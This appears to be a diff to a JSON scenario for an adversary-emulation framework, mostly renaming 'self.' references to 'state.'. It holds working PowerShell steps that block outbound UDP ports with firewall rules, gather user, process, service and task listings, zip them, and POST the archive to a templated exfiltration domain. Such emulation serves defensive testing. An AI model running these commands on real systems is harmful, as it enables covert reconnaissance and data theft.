@@ -13,7 +13,10 @@
             "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
-                "tool": "self.tool_name"
+                "tool": "state.tool_name"
+            },
+            "set_state": {
+                "actuator": "postconditions.actuator.ret.registered_id"
             }
         },
         {
@@ -21,9 +24,9 @@
             "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -31,9 +34,9 @@
             "technique": "DNS",
             "label": "DNS",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -41,11 +44,11 @@
             "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
-                "self.tool_name": "self.tool",
-                "payload": "self.payload_name",
-                "exfiltration": "self.exfil",
-                "driveby": "self.driveby",
-                "driveby_ctl": "self.chimera"
+                "state.tool_name": "state.tool",
+                "payload": "state.payload_name",
+                "exfiltration": "state.exfil",
+                "driveby": "state.driveby",
+                "driveby_ctl": "state.chimera"
             }
         },
         {
@@ -53,7 +56,7 @@
             "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
-                "tool": "self.tool"
+                "tool": "state.tool"
             }
         },
         {
@@ -61,11 +64,11 @@
             "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
-                "actuator": "self.actuator",
-                "phishing": "self.phish_1",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1_low"
+                "actuator": "state.actuator",
+                "phishing": "state.phish_1",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1_low"
             }
         },
         {
@@ -73,11 +76,11 @@
             "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "phishing": "self.phish_1",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1_low"
+                "actuator_id": "state.actuator",
+                "phishing": "state.phish_1",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1_low"
             }
         },
         {
@@ -85,11 +88,14 @@
             "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "phishing": "self.phish_1",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1_low"
+                "actuator_id": "state.actuator",
+                "phishing": "state.phish_1",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1_low"
+            },
+            "set_state": {
+                "agent_tgt1_low": "postconditions.agent.ret.agent_id"
             }
         },
         {
@@ -97,11 +103,11 @@
             "technique": "ValidAccounts_LocalAccounts",
             "label": "validAccounts_LocalAccounts_t1",
             "preconditions": {
-                "actuator": "self.actuator",
-                "agent": "self.agent_tgt1_low",
-                "tool": "self.tool",
-                "target_1": "self.target_1_low",
-                "target_2": "self.target_1"
+                "actuator": "state.actuator",
+                "agent": "state.agent_tgt1_low",
+                "tool": "state.tool",
+                "target_1": "state.target_1_low",
+                "target_2": "state.target_1"
             }
         },
         {
@@ -109,13 +115,16 @@
             "technique": "WebProtocols",
             "label": "webProtocols_1_elevated",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator_id": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             },
             "tune": {
                 "infra": true
+            },
+            "set_state": {
+                "agent_tgt1": "postconditions.agent.ret.agent_id"
             }
         },
         {
@@ -123,9 +132,9 @@
             "technique": "DisableWindowsEventLogging",
             "label": "disableWindowsEventLogging_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         },
         {
@@ -133,12 +142,12 @@
             "technique": "DisableOrModifySystemFirewall",
             "label": "disableOrModifySystemFirewall_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{netsh advfirewall firewall add rule name=\"${{'kind': 'slice', 'slice': 0, 'value': 'self.firewall_rule_name'}}\" protocol=UDP dir=out localport=137 action=block; netsh advfirewall firewall add rule name=\"${{'kind': 'slice', 'slice': 1, 'value': 'self.firewall_rule_name'}}\" protocol=UDP dir=out localport=53 action=block}"
+                "command": "powershell &{netsh advfirewall firewall add rule name=\"${{'kind': 'slice', 'slice': 0, 'value': 'state.firewall_rule_name'}}\" protocol=UDP dir=out localport=137 action=block; netsh advfirewall firewall add rule name=\"${{'kind': 'slice', 'slice': 1, 'value': 'state.firewall_rule_name'}}\" protocol=UDP dir=out localport=53 action=block}"
             }
         },
         {
@@ -146,12 +155,12 @@
             "technique": "AutomatedCollection",
             "label": "automatedCollection_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}\"; mkdir $tmpfile; echo \" \"}"
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${state.temp_dir_name}\"; mkdir $tmpfile; echo \" \"}"
             }
         },
         {
@@ -159,9 +168,9 @@
             "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "powershell &{$TempFile = New-TemporaryFile; echo \"Set oReg = GetObject(\"\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\default:StdRegProv\"\")\" > $TempFile; echo \"Const HKCU = &H80000001\" >> $TempFile; echo \"myvar=\"\"\"\"\" >> $TempFile; echo \"' actually delete these values if present.\" >> $TempFile; echo \"if (oreg.GetStringValue(HKCU, \"\".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\"\", \"\"AutoDetect\"\", myvar) = 0) then WScript.Echo \"\"Delete AutoDetect: = \"\" & myvar Else wscript.echo \"\"No AutoDetect\"\"\" >> $TempFile; echo \"if (oreg.GetStringValue(HKCU, \"\".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\"\", \"\"AutoConfigURL\"\", myvar) = 0) then WScript.Echo \"\"Delete AutoConfig: = \"\" & myvar Else wscript.echo \"\"No AutoConfig\"\"\" >> $TempFile; cscript /e:VBScript $TempFile}"
@@ -172,12 +181,12 @@
             "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}\"; fsutil volume diskfree c: > \"$tmpfile\\disk.txt\"; echo \" \"}"
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${state.temp_dir_name}\"; fsutil volume diskfree c: > \"$tmpfile\\disk.txt\"; echo \" \"}"
             }
         },
         {
@@ -185,12 +194,12 @@
             "technique": "ProcessDiscovery",
             "label": "ProcessDiscovery_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}\"; tasklist /v > \"$tmpfile\\task-list.txt\"; echo \" \"}"
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${state.temp_dir_name}\"; tasklist /v > \"$tmpfile\\task-list.txt\"; echo \" \"}"
             }
         },
         {
@@ -198,12 +207,12 @@
             "technique": "DomainAccount",
             "label": "domainAccount_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}\"; query user > \"$tmpfile\\users.txt\"; echo \" \"}"
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${state.temp_dir_name}\"; query user > \"$tmpfile\\users.txt\"; echo \" \"}"
             }
         },
         {
@@ -211,12 +220,12 @@
             "technique": "SystemServiceDiscovery",
             "label": "systemServiceDiscovery_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}\"; schtasks /query /v /fo csv > \"$tmpfile\\scheduled-tasks.txt\"; echo \" \"}"
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${state.temp_dir_name}\"; schtasks /query /v /fo csv > \"$tmpfile\\scheduled-tasks.txt\"; echo \" \"}"
             }
         },
         {
@@ -224,12 +233,12 @@
             "technique": "SystemServiceDiscovery",
             "label": "systemServiceDiscovery_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}\"; sc.exe  query type=service state=all > \"$tmpfile\\services.txt\"; echo \" \"}"
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${state.temp_dir_name}\"; sc.exe  query type=service state=all > \"$tmpfile\\services.txt\"; echo \" \"}"
             }
         },
         {
@@ -237,12 +246,12 @@
             "technique": "SystemServiceDiscovery",
             "label": "systemServiceDiscovery_t1_3",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}\"; wmic service get name,startname > \"$tmpdir\\services-wmi.txt\"; echo \" \"}"
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${state.temp_dir_name}\"; wmic service get name,startname > \"$tmpdir\\services-wmi.txt\"; echo \" \"}"
             }
         },
         {
@@ -250,12 +259,12 @@
             "technique": "ArchiveViaUtility",
             "label": "archiveViaUtility_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}\"; Compress-Archive -Path $tmpfile -DestinationPath \"$tmpfile.zip\"; echo \"success\" }"
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $tmpfile = \"C:\\users\\$username\\appdata\\local\\temp\\${state.temp_dir_name}\"; Compress-Archive -Path $tmpfile -DestinationPath \"$tmpfile.zip\"; echo \"success\" }"
             }
         },
         {
@@ -263,10 +272,10 @@
             "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "exfil": "self.exfil",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "exfil": "state.exfil",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         },
         {
@@ -274,13 +283,13 @@
             "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1",
-                "exfil": "self.exfil"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1",
+                "exfil": "state.exfil"
             },
             "tune": {
-                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $zipfile = \"C:\\users\\$username\\appdata\\local\\temp\\${self.temp_dir_name}.zip\"; Invoke-RestMethod -Uri${self.exfil_domain}/ -Method Post -InFile $zipfile;echo \" \"}"
+                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; $zipfile = \"C:\\users\\$username\\appdata\\local\\temp\\${state.temp_dir_name}.zip\"; Invoke-RestMethod -Uri${state.exfil_domain}/ -Method Post -InFile $zipfile;echo \" \"}"
             }
         },
         {
@@ -288,9 +297,9 @@
             "technique": "DisableWindowsEventLogging",
             "label": "disableWindowsEventLogging_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "powershell &{auditpol /set /category:\"Detailed Tracking\" /success:enable /failure:enable}"
@@ -301,12 +310,12 @@
             "technique": "DisableOrModifySystemFirewall",
             "label": "disableOrModifySystemFirewall_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{netsh advfirewall firewall delete rule name=\"${{'kind': 'slice', 'slice': 0, 'value': 'self.firewall_rule_name'}}\"; netsh advfirewall firewall delete rule name=\"${{'kind': 'slice', 'slice': 1, 'value': 'self.firewall_rule_name'}}\"}"
+                "command": "powershell &{netsh advfirewall firewall delete rule name=\"${{'kind': 'slice', 'slice': 0, 'value': 'state.firewall_rule_name'}}\"; netsh advfirewall firewall delete rule name=\"${{'kind': 'slice', 'slice': 1, 'value': 'state.firewall_rule_name'}}\"}"
             }
         },
         {
@@ -314,9 +323,9 @@
             "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         },
         {
@@ -324,9 +333,9 @@
             "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
-                "agent": "self.agent_tgt1_low",
-                "tool": "self.tool",
-                "target": "self.target_1_low"
+                "agent": "state.agent_tgt1_low",
+                "tool": "state.tool",
+                "target": "state.target_1_low"
             }
         }
     ],
@@ -422,131 +431,20 @@
             }
         }
     },
-    "preconditions": {
-        "state": {},
-        "initial": {
-            "tool_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "name"
-                ]
-            },
-            "payload_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "ioc-binary_payload_name"
-                ]
-            },
-            "tool": {
-                "path": [
-                    "tool",
-                    "1"
-                ]
-            },
-            "exfil": {
-                "path": [
-                    "exfil",
-                    "1"
-                ]
-            },
-            "phish_1": {
-                "path": [
-                    "phishing",
-                    "1"
-                ]
-            },
-            "driveby": {
-                "path": [
-                    "driveby",
-                    "1"
-                ]
-            },
-            "driveby_domain": {
-                "path": [
-                    "driveby",
-                    "1",
-                    "ioc-domain_driveby"
-                ]
-            },
-            "exfil_domain": {
-                "path": [
-                    "exfil",
-                    "1",
-                    "ioc-domain_exfil"
-                ]
-            },
-            "chimera": {
-                "path": [
-                    "chimera"
-                ]
-            },
-            "target_1_low": {
-                "path": [
-                    "targets",
-                    "1"
-                ]
-            },
-            "target_1": {
-                "path": [
-                    "targets",
-                    "1"
-                ]
-            },
-            "target_1_hostname": {
-                "path": [
-                    "targets",
-                    "1",
-                    "query-target_hostname"
-                ]
-            },
-            "temp_dir_name": {
-                "path": [
-                    "targets",
-                    "1",
-                    "ioc-temp_dir"
-                ]
-            },
-            "firewall_rule_name": {
-                "path": [
-                    "targets",
-                    "1",
-                    "firewall_rule_names"
-                ]
-            }
-        },
-        "effects": {
-            "actuator": {
-                "path": [
-                    "actuator",
-                    "actuator",
-                    "ret",
-                    "registered_id"
-                ],
-                "default": 0
-            },
-            "scenario_infrastructure": {
-                "path": [
-                    "infrastructure"
-                ]
-            },
-            "agent_tgt1_low": {
-                "path": [
-                    "webProtocols_1",
-                    "agent",
-                    "ret",
-                    "agent_id"
-                ]
-            },
-            "agent_tgt1": {
-                "path": [
-                    "webProtocols_1_elevated",
-                    "agent",
-                    "ret",
-                    "agent_id"
-                ]
-            }
-        }
+    "state": {
+        "tool_name": "spec.tool.1.name",
+        "payload_name": "spec.tool.1.ioc-binary_payload_name",
+        "tool": "spec.tool.1",
+        "exfil": "spec.exfil.1",
+        "phish_1": "spec.phishing.1",
+        "driveby": "spec.driveby.1",
+        "driveby_domain": "spec.driveby.1.ioc-domain_driveby",
+        "exfil_domain": "spec.exfil.1.ioc-domain_exfil",
+        "chimera": "spec.chimera",
+        "target_1_low": "spec.targets.1",
+        "target_1": "spec.targets.1",
+        "target_1_hostname": "spec.targets.1.query-target_hostname",
+        "temp_dir_name": "spec.targets.1.ioc-temp_dir",
+        "firewall_rule_name": "spec.targets.1.firewall_rule_names"
     }
 }
